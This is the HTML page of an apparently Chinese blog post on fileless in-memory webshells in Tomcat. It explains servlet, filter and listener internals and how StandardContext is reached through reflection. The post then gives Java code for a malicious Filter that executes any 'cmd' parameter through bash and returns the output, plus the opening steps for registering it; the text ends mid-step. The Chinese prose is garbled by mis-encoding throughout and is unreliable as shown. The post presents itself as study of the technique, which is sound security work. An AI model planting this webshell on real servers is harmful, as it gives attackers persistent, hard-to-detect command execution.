<!DOCTYPE html>
<html lang="en" dir="auto">

<head><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="index, follow">
<title>Tomcatå†…å­˜é©¬ | Reus09&#39;s Blog</title>
<meta name="keywords" content="å†…å­˜é©¬">
<meta name="description" content="å‰è¨€ å†…å­˜é©¬åˆåæ— æ–‡ä»¶é©¬ï¼Œå°±æ˜¯æ— æ–‡ä»¶è½åœ°çš„webshellæŠ€æœ¯ã€‚æ˜¯ç”±äº webshell ç‰¹å¾è¯†åˆ«ã€é˜²ç¯¡æ”¹ã€ç›®å½•ç›‘æ§ç­‰ç­‰é’ˆå¯¹ web åº”ç”¨ç›®å½•æˆ–æœåŠ¡å™¨æ–‡ä»¶é˜²å¾¡æ‰‹æ®µçš„ä»‹å…¥">
<meta name="author" content="Reus09">
<link rel="canonical" href="/posts/tech/tomcat%E5%86%85%E5%AD%98%E9%A9%AC/">
<link crossorigin="anonymous" href="/assets/css/stylesheet.40573d180b208ab15c3bf0a170c2ac86aa8ccf179f96f939352198fbee79100e.css" integrity="sha256-QFc9GAsgirFcO/ChcMKshqqMzxeflvk5NSGY&#43;&#43;55EA4=" rel="preload stylesheet" as="style">
<script defer crossorigin="anonymous" src="/assets/js/highlight.f413e19d0714851f6474e7ee9632408e58ac146fbdbe62747134bea2fa3415e0.js" integrity="sha256-9BPhnQcUhR9kdOfuljJAjlisFG&#43;9vmJ0cTS&#43;ovo0FeA="
    onload="hljs.initHighlightingOnLoad();"></script>
<link rel="icon" href="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211103151005.jpeg">
<link rel="icon" type="image/png" sizes="16x16" href="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211103151005.jpeg">
<link rel="icon" type="image/png" sizes="32x32" href="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211103151005.jpeg">
<link rel="apple-touch-icon" href="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211103151005.jpeg">
<link rel="mask-icon" href="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211103151005.jpeg">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
    <style>
        @media (prefers-color-scheme: dark) {
            :root {
                --theme: rgb(29, 30, 32);
                --entry: rgb(46, 46, 51);
                --primary: rgb(218, 218, 219);
                --secondary: rgb(155, 156, 157);
                --tertiary: rgb(65, 66, 68);
                --content: rgb(196, 196, 197);
                --hljs-bg: rgb(46, 46, 51);
                --code-bg: rgb(55, 56, 62);
                --border: rgb(51, 51, 51);
            }

            .list {
                background: var(--theme);
            }

            .list:not(.dark)::-webkit-scrollbar-track {
                background: 0 0;
            }

            .list:not(.dark)::-webkit-scrollbar-thumb {
                border-color: var(--theme);
            }
        }

    </style>
</noscript><meta property="og:title" content="Tomcatå†…å­˜é©¬" />
<meta property="og:description" content="å‰è¨€ å†…å­˜é©¬åˆåæ— æ–‡ä»¶é©¬ï¼Œå°±æ˜¯æ— æ–‡ä»¶è½åœ°çš„webshellæŠ€æœ¯ã€‚æ˜¯ç”±äº webshell ç‰¹å¾è¯†åˆ«ã€é˜²ç¯¡æ”¹ã€ç›®å½•ç›‘æ§ç­‰ç­‰é’ˆå¯¹ web åº”ç”¨ç›®å½•æˆ–æœåŠ¡å™¨æ–‡ä»¶é˜²å¾¡æ‰‹æ®µçš„ä»‹å…¥" />
<meta property="og:type" content="article" />
<meta property="og:url" content="/posts/tech/tomcat%E5%86%85%E5%AD%98%E9%A9%AC/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2023-04-15T14:38:38+08:00" />
<meta property="article:modified_time" content="2023-04-15T14:38:38+08:00" /><meta property="og:site_name" content="(ã€ƒ&#39;â–½&#39;ã€ƒ)" />

<meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="Tomcatå†…å­˜é©¬"/>
<meta name="twitter:description" content="å‰è¨€ å†…å­˜é©¬åˆåæ— æ–‡ä»¶é©¬ï¼Œå°±æ˜¯æ— æ–‡ä»¶è½åœ°çš„webshellæŠ€æœ¯ã€‚æ˜¯ç”±äº webshell ç‰¹å¾è¯†åˆ«ã€é˜²ç¯¡æ”¹ã€ç›®å½•ç›‘æ§ç­‰ç­‰é’ˆå¯¹ web åº”ç”¨ç›®å½•æˆ–æœåŠ¡å™¨æ–‡ä»¶é˜²å¾¡æ‰‹æ®µçš„ä»‹å…¥"/>


<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [, 
    {
      "@type": "ListItem",
      "position":  2 ,
      "name": "ğŸ“šæ–‡ç« ",
      "item": "/posts/"
    }, 
    {
      "@type": "ListItem",
      "position":  3 ,
      "name": "ğŸ‘¨ğŸ»â€ğŸ’»æŠ€æœ¯",
      "item": "/posts/tech/"
    }, 
    {
      "@type": "ListItem",
      "position":  4 ,
      "name": "Tomcatå†…å­˜é©¬",
      "item": "/posts/tech/tomcat%E5%86%85%E5%AD%98%E9%A9%AC/"
    }
  ]
}
</script>
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "Tomcatå†…å­˜é©¬",
  "name": "Tomcatå†…å­˜é©¬",
  "description": "å‰è¨€ å†…å­˜é©¬åˆåæ— æ–‡ä»¶é©¬ï¼Œå°±æ˜¯æ— æ–‡ä»¶è½åœ°çš„webshellæŠ€æœ¯ã€‚æ˜¯ç”±äº webshell ç‰¹å¾è¯†åˆ«ã€é˜²ç¯¡æ”¹ã€ç›®å½•ç›‘æ§ç­‰ç­‰é’ˆå¯¹ web åº”ç”¨ç›®å½•æˆ–æœåŠ¡å™¨æ–‡ä»¶é˜²å¾¡æ‰‹æ®µçš„ä»‹å…¥",
  "keywords": [
    "å†…å­˜é©¬"
  ],
  "articleBody": "å‰è¨€ å†…å­˜é©¬åˆåæ— æ–‡ä»¶é©¬ï¼Œå°±æ˜¯æ— æ–‡ä»¶è½åœ°çš„webshellæŠ€æœ¯ã€‚æ˜¯ç”±äº webshell ç‰¹å¾è¯†åˆ«ã€é˜²ç¯¡æ”¹ã€ç›®å½•ç›‘æ§ç­‰ç­‰é’ˆå¯¹ web åº”ç”¨ç›®å½•æˆ–æœåŠ¡å™¨æ–‡ä»¶é˜²å¾¡æ‰‹æ®µçš„ä»‹å…¥ï¼Œå¯¼è‡´çš„æ–‡ä»¶ shell éš¾ä»¥å†™å…¥å’ŒæŒä¹…è€Œè¡ç”Ÿå‡ºçš„ä¸€ç§â€œæ¦‚å¿µå‹â€æœ¨é©¬ã€‚è¿™ç§æŠ€æœ¯çš„æ ¸å¿ƒæ€æƒ³éå¸¸ç®€å•ï¼Œä¸€å¥è¯å°±èƒ½æ¦‚æ‹¬ï¼Œé‚£å°±æ˜¯å¯¹è®¿é—®è·¯å¾„æ˜ å°„åŠç›¸å…³å¤„ç†ä»£ç çš„åŠ¨æ€æ³¨å†Œã€‚\nç›®å‰å†…å­˜é©¬ä¸»è¦åˆ†ä¸ºä¸€ä¸‹å‡ ç§ï¼š\nåŠ¨æ€æ³¨å†Œ servlet/filter/listenerï¼ˆä½¿ç”¨ servlet-api çš„å…·ä½“å®ç°ï¼‰ åŠ¨æ€æ³¨å†Œ interceptor/controllerï¼ˆä½¿ç”¨æ¡†æ¶å¦‚ spring/struts2ï¼‰ åŠ¨æ€æ³¨å†Œä½¿ç”¨èŒè´£é“¾è®¾è®¡æ¨¡å¼çš„ä¸­é—´ä»¶ã€æ¡†æ¶çš„å®ç°ï¼ˆä¾‹å¦‚ Tomcat çš„ Pipeline \u0026 Valveï¼ŒGrizzly çš„ FilterChain \u0026 Filter ç­‰ç­‰ï¼‰ ä½¿ç”¨ java agent æŠ€æœ¯å†™å…¥å­—èŠ‚ç  æœ¬æ–‡ç®€å•å­¦ä¹ ä¸€ä¸‹servlet-apiç›¸å…³å®ç°çš„å†…å­˜é©¬åŸç†ã€‚\nåŸºç¡€çŸ¥è¯† Container-å®¹å™¨ç»„ä»¶ Tomcatæœ‰å››ç±»å®¹å™¨ç»„ä»¶ï¼Œä»ä¸Šè‡³ä¸‹ä¾æ¬¡æ˜¯ï¼š\nEngineï¼Œå®ç°ç±»ä¸º org.apache.catalina.core.StandardEngine Hostï¼Œå®ç°ç±»ä¸º org.apache.catalina.core.StandardHost Contextï¼Œå®ç°ç±»ä¸º org.apache.catalina.core.StandardContext Wrapperï¼Œå®ç°ç±»ä¸º org.apache.catalina.core.StandardWrapper æ¯ä¸ªWrapperå®ä¾‹è¡¨ç¤ºä¸€ä¸ªå…·ä½“çš„Servletå®šä¹‰ï¼ŒStandardWrapperæ˜¯Wrapperæ¥å£çš„æ ‡å‡†å®ç°ç±»ï¼ˆStandardWrapper çš„ä¸»è¦ä»»åŠ¡å°±æ˜¯è½½å…¥Servletç±»å¹¶ä¸”è¿›è¡Œå®ä¾‹åŒ–ï¼‰\nâ€œä»ä¸Šè‡³ä¸‹â€ çš„æ„æ€æ˜¯ï¼Œå®ƒä»¬ä¹‹é—´æ˜¯å­˜åœ¨çˆ¶å­å…³ç³»çš„ã€‚\nEngineï¼šæœ€é¡¶å±‚å®¹å™¨ç»„ä»¶ï¼Œå…¶ä¸‹å¯ä»¥åŒ…å«å¤šä¸ª Hostã€‚ Hostï¼šä¸€ä¸ª Host ä»£è¡¨ä¸€ä¸ªè™šæ‹Ÿä¸»æœºï¼Œå…¶ä¸‹å¯ä»¥åŒ…å«å¤šä¸ª Contextã€‚ Contextï¼šä¸€ä¸ª Context ä»£è¡¨ä¸€ä¸ª Web åº”ç”¨ï¼Œå…¶ä¸‹å¯ä»¥åŒ…å«å¤šä¸ª Wrapperã€‚ Wrapperï¼šä¸€ä¸ª Wrapper ä»£è¡¨ä¸€ä¸ª Servletã€‚ è¿™äº›é…ç½®ä¿¡æ¯æ˜¯å¤šå±‚æ¬¡çš„Mapã€‚æ ¹æ®è¯·æ±‚å®šä½åˆ°æŒ‡å®šservletçš„æµç¨‹å›¾å¦‚ä¸‹:\nFilter Servlet Listener è¿™é‡Œç®€å•è®²ä¸€ä¸‹Tomcatä¸­æµé‡çš„è¯·æ±‚è·¯çº¿\nå®¢æˆ·ç«¯å‘èµ·çš„webè¯·æ±‚ä¼šä¾æ¬¡ç»è¿‡Listenerã€Filterã€Servletä¸‰ä¸ªç»„ä»¶ Servlet: Servlet æ˜¯è¿è¡Œåœ¨ Web æœåŠ¡å™¨æˆ–åº”ç”¨æœåŠ¡å™¨ä¸Šçš„ç¨‹åºï¼Œå®ƒæ˜¯ä½œä¸ºæ¥è‡ª HTTP å®¢æˆ·ç«¯çš„è¯·æ±‚å’Œ HTTP æœåŠ¡å™¨ä¸Šçš„æ•°æ®åº“æˆ–åº”ç”¨ç¨‹åºä¹‹é—´çš„ä¸­é—´å±‚ã€‚å®ƒè´Ÿè´£å¤„ç†ç”¨æˆ·çš„è¯·æ±‚ï¼Œå¹¶æ ¹æ®è¯·æ±‚ç”Ÿæˆç›¸åº”çš„è¿”å›ä¿¡æ¯æä¾›ç»™ç”¨æˆ·ã€‚\nServletçš„ç”Ÿå‘½å‘¨æœŸï¼š Servlet çš„ç”Ÿå‘½å‘¨æœŸå¼€å§‹äºWebå®¹å™¨çš„å¯åŠ¨æ—¶ï¼Œå®ƒå°±ä¼šè¢«è½½å…¥åˆ°Webå®¹å™¨å†…å­˜ä¸­ï¼Œç›´åˆ°Webå®¹å™¨åœæ­¢è¿è¡Œæˆ–è€…é‡æ–°è£…å…¥servletæ—¶å€™ç»“æŸã€‚è¿™é‡Œä¹Ÿå°±æ˜¯è¯´æ˜ï¼Œä¸€æ—¦Servletè¢«è£…å…¥åˆ°Webå®¹å™¨ä¹‹åï¼Œä¸€èˆ¬æ˜¯ä¼šé•¿ä¹…é©»ç•™åœ¨Webå®¹å™¨ä¹‹ä¸­ã€‚ è£…å…¥ï¼šå¯åŠ¨æœåŠ¡å™¨æ—¶åŠ è½½Servletçš„å®ä¾‹ åˆå§‹åŒ–ï¼šwebæœåŠ¡å™¨å¯åŠ¨æ—¶æˆ–webæœåŠ¡å™¨æ¥æ”¶åˆ°è¯·æ±‚æ—¶ï¼Œæˆ–è€…ä¸¤è€…ä¹‹é—´çš„æŸä¸ªæ—¶åˆ»å¯åŠ¨ã€‚åˆå§‹åŒ–å·¥ä½œæœ‰init()æ–¹æ³•è´Ÿè´£æ‰§è¡Œå®Œæˆ è°ƒç”¨ï¼šä»ç¬¬ä¸€æ¬¡åˆ°ä»¥åçš„å¤šæ¬¡è®¿é—®ï¼Œéƒ½æ˜¯åªè°ƒç”¨doGet()æˆ–doPost()æ–¹æ³• é”€æ¯ï¼šåœæ­¢æœåŠ¡å™¨æ—¶è°ƒç”¨destroy()æ–¹æ³•ï¼Œé”€æ¯å®ä¾‹ Filter: Filter æˆ‘ä»¬ç§°ä¹‹ä¸ºè¿‡æ»¤å™¨ï¼Œæ˜¯ Java ä¸­æœ€å¸¸è§ä¹Ÿæœ€å®ç”¨çš„æŠ€æœ¯ä¹‹ä¸€ï¼Œé€šå¸¸è¢«ç”¨æ¥å¤„ç†é™æ€ web èµ„æºã€è®¿é—®æƒé™æ§åˆ¶ã€è®°å½•æ—¥å¿—ç­‰é™„åŠ åŠŸèƒ½ç­‰ç­‰ã€‚ä¸€æ¬¡è¯·æ±‚è¿›å…¥åˆ°æœåŠ¡å™¨åï¼Œå°†å…ˆç”± Filter å¯¹ç”¨æˆ·è¯·æ±‚è¿›è¡Œé¢„å¤„ç†ï¼Œå†äº¤ç»™ Servletã€‚\nFilterçš„ç”Ÿå‘½å‘¨æœŸï¼š è‡ªå®šä¹‰Filterçš„å®ç°ï¼Œéœ€è¦å®ç°javax.servlet.Filterä¸‹çš„init()ã€doFilter()ã€destroy()ä¸‰ä¸ªæ–¹æ³•ã€‚\nå¯åŠ¨æœåŠ¡å™¨æ—¶åŠ è½½è¿‡æ»¤å™¨çš„å®ä¾‹ï¼Œå¹¶è°ƒç”¨init()æ–¹æ³•æ¥åˆå§‹åŒ–å®ä¾‹ï¼› æ¯ä¸€æ¬¡è¯·æ±‚æ—¶éƒ½åªè°ƒç”¨æ–¹æ³•doFilter()è¿›è¡Œå¤„ç†ï¼› åœæ­¢æœåŠ¡å™¨æ—¶è°ƒç”¨destroy()æ–¹æ³•ï¼Œé”€æ¯å®ä¾‹ã€‚ Listener ç›‘å¬å™¨ï¼ˆListenerï¼‰å°±æ˜¯Applicationã€Sessionå’ŒRequestä¸‰å¤§å¯¹è±¡åˆ›å»ºã€é”€æ¯æˆ–è€…å¾€å…¶ä¸­æ·»åŠ ã€ä¿®æ”¹ã€åˆ é™¤å±æ€§æ—¶è‡ªåŠ¨æ‰§è¡Œä»£ç çš„åŠŸèƒ½ç»„ä»¶ã€‚\nä¸‹é¢æ˜¯ä¸€äº›å¸¸ç”¨çš„Listenerçš„ç”¨é€”\nServletContextListenerï¼šå¯¹Servletä¸Šä¸‹æ–‡çš„åˆ›å»ºå’Œé”€æ¯è¿›è¡Œç›‘å¬ï¼› ServletContextAttributeListenerï¼šç›‘å¬Servletä¸Šä¸‹æ–‡å±æ€§çš„æ·»åŠ ã€åˆ é™¤å’Œæ›¿æ¢ï¼› HttpSessionListenerï¼šå¯¹Sessionçš„åˆ›å»ºå’Œé”€æ¯è¿›è¡Œç›‘å¬ã€‚Sessionçš„é”€æ¯æœ‰ä¸¤ç§æƒ…å†µï¼Œä¸€ä¸ªä¸­Sessionè¶…æ—¶ï¼Œè¿˜æœ‰ä¸€ç§æ˜¯é€šè¿‡è°ƒç”¨Sessionå¯¹è±¡çš„invalidate()æ–¹æ³•ä½¿sessionå¤±æ•ˆã€‚ HttpSessionAttributeListenerï¼šå¯¹Sessionå¯¹è±¡ä¸­å±æ€§çš„æ·»åŠ ã€åˆ é™¤å’Œæ›¿æ¢è¿›è¡Œç›‘å¬ï¼› ServletRequestListenerï¼šå¯¹è¯·æ±‚å¯¹è±¡çš„åˆå§‹åŒ–å’Œé”€æ¯è¿›è¡Œç›‘å¬ï¼› ServletRequestAttributeListenerï¼šå¯¹è¯·æ±‚å¯¹è±¡å±æ€§çš„æ·»åŠ ã€åˆ é™¤å’Œæ›¿æ¢è¿›è¡Œç›‘å¬ã€‚ Listenerçš„ç”Ÿå‘½å‘¨æœŸï¼š ä»¥ServletRequestListenerä¸ºä¾‹ï¼ŒServletRequestListenerä¸»è¦ç”¨äºç›‘å¬ServletRequestå¯¹è±¡çš„åˆ›å»ºå’Œé”€æ¯,ä¸€ä¸ªServletRequestå¯ä»¥æ³¨å†Œå¤šä¸ªServletRequestListeneræ¥å£ã€‚\næ¯æ¬¡è¯·æ±‚åˆ›å»ºæ—¶è°ƒç”¨requestInitialized()ã€‚ æ¯æ¬¡è¯·æ±‚é”€æ¯æ—¶è°ƒç”¨requestDestroyed()ã€‚ ServletContextä¸StandardContextçš„å…³ç³» å½“ Web å®¹å™¨å¯åŠ¨çš„æ—¶å€™ä¼šä¸ºæ¯ä¸ª Web åº”ç”¨éƒ½åˆ›å»ºä¸€ä¸ª ServletContext å¯¹è±¡ï¼Œä»£è¡¨å½“å‰ Web åº”ç”¨ã€‚\nTomcatä¸­å¯¹åº”çš„ServletContextå®ç°æ˜¯ApplicationContextã€‚\nåœ¨Webåº”ç”¨ä¸­è·å–çš„ServletContextå®é™…ä¸Šæ˜¯ApplicationContextFacadeå¯¹è±¡ï¼Œå¯¹ApplicationContextè¿›è¡Œäº†å°è£…ï¼Œè€ŒApplicationContextå®ä¾‹ä¸­åˆåŒ…å«äº†StandardContextå®ä¾‹ï¼Œä»¥æ­¤æ¥è·å–æ“ä½œTomcatå®¹å™¨å†…éƒ¨çš„ä¸€äº›ä¿¡æ¯ï¼Œä¾‹å¦‚Servletçš„æ³¨å†Œç­‰ã€‚\né€šè¿‡ä¸‹é¢çš„å›¾å¯ä»¥å¾ˆæ¸…æ™°çš„çœ‹åˆ°ä¸¤è€…ä¹‹é—´çš„å…³ç³»ï¼š\nå¦‚ä½•è·å–StandardContext ç”±ServletContextè½¬StandardContextï¼Œå¦‚æœå¯ä»¥ç›´æ¥è·å–åˆ°requestå¯¹è±¡çš„è¯å¯ä»¥ç”¨è¿™ç§æ–¹æ³•\n1 2 3 4 5 6 7 8 Field applicationContextField = ApplicationContextFacade.class.getDeclaredField(\"context\"); applicationContextField.setAccessible(true); Field standardContextField = ApplicationContext.class.getDeclaredField(\"context\"); standardContextField.setAccessible(true); ServletContext servletContext = servletRequest.getServletContext(); ApplicationContext applicationContext= (ApplicationContext) applicationContextField.get(servletContext); StandardContext standardContext = (StandardContext) standardContextField.get(applicationContext); servletç¯å¢ƒçš„requestå®é™…ä¸Šä¸ºRequestFacadeå¯¹è±¡ï¼Œå®ƒçš„requestå±æ€§å­˜å‚¨äº†Requestå¯¹è±¡ï¼ŒRequestå¯¹è±¡çš„getContextèƒ½ç›´æ¥æ‹¿åˆ°Context\n1 2 3 4 Field requestField = servletRequest.getClass().getDeclaredField(\"request\"); requestField.setAccessible(true); Request request1 = (Request) requestField.get(request); StandardContext standardContext = (StandardContext) request1.getContext(); å†…å­˜é©¬ Filterå†…å­˜é©¬ æ³¨å†Œæµç¨‹ æ³¨å†Œä¸€ä¸ªServletï¼Œurl-patterä¸º/test\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 package servlet; import javax.servlet.ServletException; import javax.servlet.annotation.WebServlet; import javax.servlet.http.HttpServlet; import javax.servlet.http.HttpServletRequest; import javax.servlet.http.HttpServletResponse; import java.io.IOException; /** * @ClassName TestServlet * @Description TODO * @Author reus09 * @Date 2023/4/8 19:20 * @Version 1.0 **/ public class TestServlet extends HttpServlet { @Override protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException { resp.getWriter().append(\"Hello,This is Test\"); } @Override protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException { resp.getWriter().append(\"Hello,This is Test\"); // super.doGet(req, resp); } } è‡ªå®šä¹‰Filter:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 package filter; import javax.servlet.*; import java.io.IOException; /** * @ClassName DemoFilter * @Description TODO * @Author reus09 * @Date 2023/4/8 19:27 * @Version 1.0 **/ public class DemoFilter implements Filter { @Override public void init(FilterConfig filterConfig) throws ServletException { System.out.println(\"Filter åˆå§‹åŒ–åˆ›å»º\"); } @Override public void destroy() { } @Override public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws ServletException, IOException { System.out.println(\"æ‰§è¡Œè¿‡æ»¤æ“ä½œ!\"); filterChain.doFilter(servletRequest,servletResponse); } } ä¿®æ”¹web.xmlæŒ‡å®šServletï¼ŒFilterçš„url-pattterä¸º/test\nFilterè°ƒç”¨é“¾ é¦–å…ˆè®²ä¸€ä¸‹ä¸€äº›åŸºç¡€çš„ç±»ï¼š\nFilterDefsï¼šå­˜æ”¾FilterDefçš„æ•°ç»„ ï¼ŒFilterDef ä¸­å­˜å‚¨ç€æˆ‘ä»¬ FilterNameï¼ŒFilterå¯¹åº”ç±»ç­‰åŸºæœ¬ä¿¡æ¯\nFilterConfigsï¼šå­˜æ”¾filterConfigçš„æ•°ç»„ï¼Œåœ¨ FilterConfig ä¸­ä¸»è¦å­˜æ”¾ FilterDef å’Œ Filterå¯¹è±¡ç­‰ä¿¡æ¯\nFilterMapsï¼šå­˜æ”¾FilterMapçš„æ•°ç»„ï¼Œåœ¨ FilterMap ä¸­ä¸»è¦å­˜æ”¾äº† FilterName å’Œ å¯¹åº”çš„URLPattern\nFilterChainï¼šè¿‡æ»¤å™¨é“¾ï¼Œè¯¥å¯¹è±¡ä¸Šçš„ doFilter æ–¹æ³•èƒ½ä¾æ¬¡è°ƒç”¨é“¾ä¸Šçš„ Filter\nåœ¨ StandardWrapperValve ä¸­ä¼šåˆ©ç”¨ ApplicationFilterFactory æ¥åˆ›å»ºfilterChainï¼ˆfilteré“¾ï¼‰,è·Ÿè¿›createFilterChainæ–¹æ³•ã€‚\nåœ¨createFilterchainæ–¹æ³•ä¸­å…ˆé€šè¿‡wrapper.getParent()è·å¾—å½“å‰çš„StandardContextï¼Œç„¶åä»contextä¸­è·å–FilterMaps\næ¥ç€createChainæ–¹æ³•ä¼šéå† FilterMaps ä¸­çš„ FilterMapï¼Œå¦‚æœå‘ç°ç¬¦åˆå½“å‰è¯·æ±‚ url ä¸ FilterMap ä¸­çš„ urlPattern ç›¸åŒ¹é…ï¼Œå°±ä¼šè¿›å…¥ if åˆ¤æ–­ï¼Œè°ƒç”¨ findFilterConfig æ–¹æ³•åœ¨ filterConfigs ä¸­å¯»æ‰¾å¯¹åº” filterNameåç§°çš„ FilterConfigï¼Œç„¶åå¦‚æœä¸ä¸ºnullï¼Œå°±è¿›å…¥ if åˆ¤æ–­ï¼Œå°† filterConfig æ·»åŠ åˆ° filterChainä¸­ã€‚\nä¸Šè¿°å¦‚æœè·å–åˆ°çš„filterConfigä¸ä¸ºnullçš„è¯ï¼Œå°±è°ƒç”¨org.apache.catalina.core.ApplicationFilterChain#addFilteræ–¹æ³•å°†å½“å‰Filteræ·»åŠ åˆ°FilterChainä¸Šé¢ã€‚\né¦–å…ˆä¼šéå†filtersï¼Œåˆ¤æ–­æˆ‘ä»¬çš„filteræ˜¯å¦å·²ç»å­˜åœ¨ï¼ˆå…¶å®å°±æ˜¯å»é‡ï¼‰ï¼Œæ¥ä¸‹æ¥çš„ if åˆ¤æ–­å°±æ˜¯æ‰©å®¹ï¼Œå¦‚æœ n å·²ç»ç­‰äºå½“å‰ filters çš„é•¿åº¦äº†å°±å†æ·»åŠ 10ä¸ªå®¹é‡ï¼Œæœ€åå°†æˆ‘ä»¬çš„filterConfig æ·»åŠ åˆ° filtersä¸­ã€‚\nè‡³æ­¤ filterChain ç»„è£…å®Œæ¯•ï¼Œé‡æ–°å›åˆ° StandardContextvalve ä¸­ï¼Œè°ƒç”¨ filterChain çš„ doFilter æ–¹æ³•,è·Ÿè¿›è¯¥æ–¹æ³•ã€‚\nåœ¨doFilteræ–¹æ³•å®é™…ä¸Šè°ƒç”¨org.apache.catalina.core.ApplicationFilterChain#internalDoFilteræ–¹æ³•\nåœ¨internalDoFilteræ–¹æ³•ä¸­é¦–å…ˆä¼šä¾æ¬¡ä» filters ä¸­å–å‡º filterConfig\nç„¶åä¼šè°ƒç”¨ getFilter() å°† filter ä» filterConfig ä¸­å–å‡ºï¼Œè°ƒç”¨ filter çš„ doFilteræ–¹æ³•\næœ€åè°ƒç”¨æˆ‘ä»¬è‡ªå®šä¹‰è¿‡æ»¤å™¨çš„doFilteræ–¹æ³•ï¼Œè§¦å‘ä»£ç ã€‚\nåšä¸€ä¸ªç®€å•çš„æµç¨‹æ€»ç»“ï¼š\nè·å–å½“å‰çš„StandardContext,ä»ä¸­è·å–å½“å‰çš„FilterMaps æ ¹æ®è¯·æ±‚çš„ URL ä» FilterMaps ä¸­æ‰¾å‡ºä¸ä¹‹ URL å¯¹åº”çš„ FilterName æ ¹æ® FilterNameå» FilterConfigs ä¸­å¯»æ‰¾å¯¹åº”åç§°çš„ FilterConfig æ‰¾åˆ°å¯¹åº”çš„ FilterConfig ä¹‹åæ·»åŠ åˆ° FilterChainä¸­ï¼Œå¹¶ä¸”è¿”å› FilterChain FilterChain ä¸­è°ƒç”¨ internalDoFilter éå†è·å– chain ä¸­çš„ FilterConfig ï¼Œç„¶åä» FilterConfig ä¸­è·å– Filterï¼Œç„¶åè°ƒç”¨ Filter çš„ doFilter æ–¹æ³• é€šè¿‡ä¸Šè¿°æµç¨‹å¯ä»¥çŸ¥é“ï¼Œæ¯æ¬¡è¯·æ±‚çš„ FilterChain æ˜¯åŠ¨æ€åŒ¹é…è·å–å’Œç”Ÿæˆçš„ï¼Œå¦‚æœæƒ³æ·»åŠ ä¸€ä¸ª Filter ï¼Œéœ€è¦åœ¨ StandardContext ä¸­ filterMaps ä¸­æ·»åŠ  FilterMapï¼Œåœ¨ filterConfigs ä¸­æ·»åŠ  FilterConfigã€‚è¿™æ ·ç¨‹åºåˆ›å»ºæ—¶å°±å¯ä»¥æ‰¾åˆ°æ·»åŠ çš„ Filter äº†ã€‚\nåˆ©ç”¨è¿‡ç¨‹ çœ‹ä¸€ä¸‹StandardContextå­˜å‚¨çš„filterConfigã€filterMapsã€filterDefsã€‚\nFilterMapä¸»è¦å­˜å‚¨filterName å’Œ urlPattern\nFilterConfigä¸»è¦å­˜å‚¨FilterDefå¯¹è±¡å’ŒFilterå¯¹è±¡ï¼ŒæŒ‡å®šå½“å‰çš„Contextä¸ºStandardContextã€‚\nFilterDefä¸»è¦å­˜å‚¨filterNameå’ŒFilterClass\nå†…å­˜é©¬æ„é€ å¤§è‡´æµç¨‹å¦‚ä¸‹ï¼š\nåˆ›å»ºæ¶æ„ Filter åˆ©ç”¨ FilterDef å¯¹ Filter è¿›è¡Œä¸€ä¸ªå°è£… å°† FilterDef æ·»åŠ åˆ° FilterDefs å’Œ FilterConfig åˆ›å»º FilterMap ï¼Œå°†æˆ‘ä»¬çš„ Filter å’Œ urlpattern ç›¸å¯¹åº”ï¼Œå­˜æ”¾åˆ° filterMapsä¸­ï¼ˆç”±äº Filter ç”Ÿæ•ˆä¼šæœ‰ä¸€ä¸ªå…ˆåé¡ºåºï¼Œæ‰€ä»¥æˆ‘ä»¬ä¸€èˆ¬éƒ½æ˜¯æ”¾åœ¨æœ€å‰é¢ï¼Œè®©æˆ‘ä»¬çš„ Filter æœ€å…ˆè§¦å‘ï¼‰ å› ä¸ºæ¯æ¬¡è¯·æ±‚createFilterChainéƒ½ä¼šä¾æ®æ­¤åŠ¨æ€ç”Ÿæˆä¸€ä¸ªè¿‡æ»¤é“¾.\nè€ŒStandardContextåˆä¼šä¸€ç›´ä¿ç•™åˆ°Tomcatç”Ÿå‘½å‘¨æœŸç»“æŸï¼Œæ‰€ä»¥æˆ‘ä»¬çš„å†…å­˜é©¬å°±å¯ä»¥ä¸€ç›´é©»ç•™ä¸‹å»ï¼Œç›´åˆ°Tomcaté‡å¯ã€‚\nåˆ›å»ºæ¶æ„Filter æ¶æ„çš„Filterï¼Œæ¥å—cmdä¸ºå‚æ•°ï¼Œè°ƒç”¨new ProcessBuilder(\"bash\",\"-c\",req.getParameter(\"cmd\")).start();å®ç°å‘½ä»¤æ‰§è¡Œã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 String filtername = \"reus09\"; Filter filter = new Filter() { @Override public void init(FilterConfig filterConfig) throws ServletException { } @Override public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException { HttpServletRequest req = (HttpServletRequest) servletRequest; if (req.getParameter(\"cmd\") != null){ byte[] bytes = new byte[1024]; Process process = new ProcessBuilder(\"bash\",\"-c\",req.getParameter(\"cmd\")).start(); int len = process.getInputStream().read(bytes); servletResponse.getWriter().write(new String(bytes,0,len)); process.destroy(); return; } filterChain.doFilter(servletRequest,servletResponse); } @Override public void destroy() { } }; å°è£…FilterDef æ„é€ ä¸€ä¸ªFilterDef,è®¾ç½®å®ƒçš„FilterName,FilterClass,Filterå¯¹è±¡ã€‚\n1 2 3 4 FilterDef filterDef = new FilterDef(); filterDef.setFilter(filter); filterDef.setFilterName(filtername); filterDef.setFilterClass(filter.getClass().getName()); æ·»åŠ åˆ° FilterDefs å’Œ 